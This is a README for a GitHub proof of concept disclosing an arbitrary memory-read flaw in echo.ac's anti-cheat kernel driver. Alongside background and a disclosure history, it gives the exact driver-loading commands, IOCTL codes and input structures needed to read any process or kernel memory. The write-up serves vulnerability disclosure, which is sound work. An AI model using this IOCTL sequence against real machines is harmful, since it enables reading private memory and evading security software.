![ok-removebg-preview](https://github.com/kite03/echoac-poc/assets/67329371/365b0d25-9643-4987-9e6d-ef062d105f35)

## A PoC and writeup on vulnerabilties discovered in echo.ac's driver.

## 💕 Credits

- Whanos: https://github.com/Whanos/
- Lemon
- kite03: https://github.com/kite03/

## Background
echo.ac is a commercial "screensharing tool", marketed and developed mostly for the Minecraft PvP community, but also used by some other game communities, such as Rust.
A "screensharing tool" is a program developed to "assist" server admins in identifying if someone's using cheats or similar banned external tools ingame - As such, these programs execute numerous intrusive scans on users computer, while being very vague of what they data collect and why.

When this point was brought up to them, they reacted aggressively and attacked us for criticising this practice. We think that it is unfair that users can be banned for not wanting to run this invasive software.

We also disclosed this exploit to them in private before disclosing it publicly, but they brushed us off and told us that we didn't know what we were talking about. welp.

To read our interactions with the staff team of this company, and to see the companys' response to us disclosing this exploit to them, visit https://github.com/kite03/echoac-poc/blob/main/Writeup.md. it's honestly quite damming.

## The Main Memory IOCTL Bug (CVE ID requested)
### A simple working PoC can be found in the PoC folder.

`echo-free.exe` deploys a Kernel driver named `echo_driver.sys`, which it uses mainly to scan process memory to "check for cheats".

A local attacker can send a series of specially crafted IOCTLs to the driver, which allows an attacker to arbitrarily read and query process memory and kernel memory.

The IOCTL sequence is as followed:
- Deploy the driver (if not loaded already) using the command ```sc create EchoDrv binpath= C:\PathToDriver.sys type= kernel``` and then start it with `sc start EchoDrv`
- Attain a handle to the device with `DeviceIoControl` on device path `\\\\.\\EchoDrv`
- Call IOCTL `0x9e6a0594` with no input buffer, but set an output void* buffer of length `4096`.
- Call IOCTL `0xe6224248` using the following structure as an input, setting the PID and program access as needed.
  - ```
    struct k_get_handle {
        DWORD pid;
        ACCESS_MASK access;
        HANDLE handle;
    };
    ```
  - This returns a HANDLE to the process.
- `malloc` a new buffer of your wanted type and size, then call IOCTL `0x60a26124` using the following structure to ask the driver to execute `MmCopyVirtualMemory` on your arguments.
  - ```
    struct k_param_readmem {
        HANDLE targetProcess;
        void* fromAddress;
        void* toAddress;
        size_t length;
        void* padding;
        uint32_t returnCode;
    };
    ```
  - The requested data will be located in the buffer pointed to in `toAddress`.
- Close driver handle, and then use command `sc stop EchoDrv && sc delete EchoDrv` to remove the driver from the Kernel.

## Extra Driver Info
- The driver was built on June 18th 2021, so presumably all client program versions from that point onwards are vulnerable.
- The vulnerable driver's SHA256 hash is `ea3c5569405ed02ec24298534a983bcb5de113c18bc3fd01a4dd0b5839cd17b9`.
